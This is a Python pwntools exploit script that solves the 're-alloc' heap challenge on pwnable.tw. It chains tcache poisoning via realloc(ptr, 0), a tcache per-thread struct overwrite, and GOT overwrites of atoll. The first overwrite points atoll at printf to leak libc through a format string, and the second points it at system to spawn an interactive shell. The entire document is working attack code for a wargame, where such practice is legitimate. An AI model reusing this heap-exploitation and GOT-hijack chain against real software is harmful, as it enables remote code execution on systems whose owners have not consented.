from pwn import *

#context.log_level = 'debug'

r = remote('chall.pwnable.tw', 10106)

elf = ELF('./re-alloc')
libc = ELF('./lib/libc.so.6')

def malloc(idx, size, content=b''):
	r.recvuntil(b'Your choice: ')
	r.sendline(b'1')

	r.recvuntil(b'Index:')
	r.sendline(idx)

	r.recvuntil(b'Size:')
	r.sendline(str(size).encode())

	r.recvuntil(b'Data:')
	r.sendline(content)

def realloc(idx, size, content=b''):
	r.recvuntil(b'Your choice: ')
	r.sendline(b'2')

	r.recvuntil(b'Index:')
	r.sendline(str(idx).encode())

	r.recvuntil(b'Size:')
	r.sendline(str(size).encode())

	if (size == 0):
		return

	r.recvuntil(b'Data:')
	r.sendline(content)

def free(idx):	
	r.recvuntil(b'Your choice: ')
	r.sendline(b'3')

	r.recvuntil(b'Index:')
	r.sendline(str(idx).encode())

def get_libc_base():	
	leak2base = 0x12e009

	r.recvuntil(b'Your choice: ')
	r.sendline(b'1')

	r.recvuntil(b'Index:')
	r.sendline(b'%p%p%p')

	return int(r.recv(32)[18:], 16) - leak2base

def get_shell():	
	r.recvuntil(b'Your choice: ')
	r.sendline(b'1')

	r.recvuntil(b'Index:')
	r.sendline(b'/bin/sh\x00')

heap_ptrs = 0x04040b0

atoll_got = elf.got['atoll']
printf_plt = elf.plt['printf']

# tcache poisoning to reach <'heap' address> - 0x10

# create freed chunk with size 0x80 to next free(0x80) will put address to 'fd'
malloc(b'0', 0x70)
free(0)

# create chunks and free second one to get 1 at tcache 'counts;
malloc(b'1', 0x20)
malloc(b'0', 0x20)
free(1)

# make free() without rfree() (tcache counts == 2)
# despite error-logs process does free() from realloc(ptr, 0)
realloc(0, 0)
realloc(0, 0x20, p64(heap_ptrs - 0x10))

# allocate chunk upper top-chunk (tcache counts == 1 and fd points to <'heap' address> - 0x10)
# and reallocate it to new larger chunk will take a part from top-chunk
# instead of putting it to tcache
malloc(b'1', 0x20)
realloc(1, 0x30)
free(1)

# create fake chunk with 0-idx points to itself
payload = p64(0) + p64(0x21) + p64(heap_ptrs)[:-1]
malloc(b'1', 0x20, payload)

# free created chunk to get tcache-perthread-struct address at 1-idx
free(0)

# new tcache => entries[0x20] -> atoll@got & entries[0x30] -> atoll@got
payload = p8(1) * 2 + p8(0) * 6 + p64(0) * 7 + p64(atoll_got) * 2

# tcache overwrite
realloc(1, 0x78, payload)

# free tcache to get positive values (as 'fd' addr) at 'counts' indexes and set 1-idx to zeros
free(1)

# the first one GOT-overwrite to get libc leak (atoll@got -> printf@plt)
malloc(b'0', 0x20, p64(printf_plt))

# get a leak via format string specifiers '%p'
libc_base = get_libc_base()
system = libc_base + libc.sym['system']

log.success(f'Libc base : {hex(libc_base)}')
log.success(f'system() : {hex(system)}')

#the second one GOT-overwrite to get a shell (atoll@got -> system())
# printf resurns value which equals printed symbols (1-idx & 8 bytes to data)
malloc(b'\x61\x00', 'a' * 8, p64(system))

# trigger atoll() => system('/bin/sh')
get_shell()

r.interactive()
